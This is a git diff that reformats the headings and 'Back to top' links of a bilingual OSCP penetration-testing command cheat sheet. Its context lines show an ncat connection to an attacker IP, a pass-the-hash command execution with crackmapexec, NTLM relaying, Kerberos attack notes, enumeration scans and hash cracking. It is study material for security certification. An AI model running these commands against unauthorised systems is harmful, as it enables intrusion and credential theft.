@@ -23,7 +23,6 @@ Expect Spanglish, this is a cheatsheet.
 
 ## Misc Commands from Linux
 
-[Back to top](#oscp_command-cheatsheet)
 
 ### Strings and files manipulation
 
@@ -75,12 +74,11 @@ cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn
 
 ```
 
-### Some Netcat (nc, nc.exe, ncat) commands 
-
 [Back to top](#oscp_command-cheatsheet)
 
-```
+### Some Netcat (nc, nc.exe, ncat) commands 
 
+```
 # Conectarse a otro puerto en otro host
 nc -nv <ip_address> 110
 
@@ -113,9 +111,9 @@ ncat -v <attacker_ip_Address> 444 --ssl
 
 ```
 
-### Wireshark Filters and pcap related
-
 [Back to top](#oscp_command-cheatsheet)
+
+### Wireshark Filters and pcap related
 
 ```
 # Filtro para mostrar trafico en puerto SMTP (25) y ICMP
@@ -138,12 +136,11 @@ tcpdump tcp port 80 -w output.pcap -i eth0
 
 ```
 
-### Basic AF git commands
-
 [Back to top](#oscp_command-cheatsheet)
 
-```
+### Basic AF git commands
 
+```
 # Enumerar todos los archivos nuevos o modificados que se deben confirmar
 git status
 
@@ -185,12 +182,11 @@ git config --global color.ui auto
 
 ```
 
-### Remote Desktop
-
 [Back to top](#oscp_command-cheatsheet)
 
-```
+### Remote Desktop
 
+```
 # Using xfreerdp
  xfreerdp /u:'domain\user' /p:'Password' /v:host_ip:3389 (or another port if 3389 is not the case)
 
@@ -199,9 +195,9 @@ rdesktop ip_address -k es -u user -p pass -d domain
 
 ```
 
-### Transfer files to windows
-
 [Back to top](#oscp_command-cheatsheet)
+
+### Transfer files to windows
 
 ```
 # En la máquina kali)
@@ -225,14 +221,13 @@ NET USE f: \\ip_kali\nombre_deseado_share /PERSISTENT:YES
 
 ```
 
-## Port Scanning
-
 [Back to top](#oscp_command-cheatsheet)
+
+## Port Scanning
 
 This only contains what I normally use, there are more options available at [S4vitar - Preparación OSCP - Port Scanning](https://gist.github.com/s4vitar/b88fefd5d9fbbdcc5f30729f7e06826e#port-scanning)
 
 ```
-
 # Puertos abiertos
 sudo nmap -sS -p- --min-rate 10000 -oN hostnameOpenPorts hostname
 
@@ -241,12 +236,11 @@ map -sS -sV -O -sC --min-rate 1000 -p25,80,110,135,139,143,445,587,5985,47001 -o
 
 ```
 
-## Web Directory Scanning (and related)
-
 [Back to top](#oscp_command-cheatsheet)
 
-```
+## Web Directory Scanning (and related)
 
+```
 # GoBuster
 gobuster dir -u <URL> -w <wordlist> -x <desired_extensions> -k
 
@@ -267,9 +261,9 @@ go/bin/shortscan http://url
 
 ```
 
-## DNS Enumeration
-
 [Back to top](#oscp_command-cheatsheet)
+
+## DNS Enumeration
 
 ```
 # Búsqueda d ehosts con Nmap
@@ -307,9 +301,9 @@ dig axfr  @<DNS_IP> <DOMAIN>
 
 ```
 
-## Manually enumerate LDAP through Python console
-
 [Back to top](#oscp_command-cheatsheet)
+
+## Manually enumerate LDAP through Python console
 
 More LDAP search filters available at [Jonlabelle Gist](https://gist.github.com/jonlabelle/0f8ec20c2474084325a89bc5362008a7) 
 
@@ -341,12 +335,11 @@ More LDAP search filters available at [Jonlabelle Gist](https://gist.github.com/
 
 ```
 
-## SMB Enumeration
-
 [Back to top](#oscp_command-cheatsheet)
 
-```
+## SMB Enumeration
 
+```
 # Info Con Enum4Linux
 enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
 
@@ -389,12 +382,11 @@ crackmapexec smb 192.168.10.11 [-d Domain] -u Administrator -H <NTHASH> -x whoam
 
 ```
 
-## RPC Enumeration
-
 [Back to top](#oscp_command-cheatsheet)
 
-```
+## RPC Enumeration
 
+```
 # Conexión anónima (el resto de comandos son una vez se ha establecido la conexión)
 rpcclient -U "" -N <IP_ADDRESS>
 
@@ -449,9 +441,9 @@ netsharegetinfo <share>
 
 ```
 
-## Kerberos attacks
-
 [Back to top](#oscp_command-cheatsheet)
+
+## Kerberos attacks
 
 Recomendado [Tarlogic - ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/#Kerberoasting)
 
@@ -497,12 +489,11 @@ sudo python /usr/local/bin/ntlmrelayx.py --no-http-server -smb2support -t <targe
 
 ```
 
-## Hascat, John and HashCracking related
-
 [Back to top](#oscp_command-cheatsheet)
 
-```
+## Hascat, John and HashCracking related
 
+```
 # Hash detection using [Name-That-Hash](https://github.com/HashPals/Name-That-Hash)
 nth -f hash_file --no-banner -a
 
@@ -539,6 +530,6 @@ john --format=crypt hash.txt --wordlist:/your/wordlist/list.txt
 
 ```
 
-
+[Back to top](#oscp_command-cheatsheet)
 
 
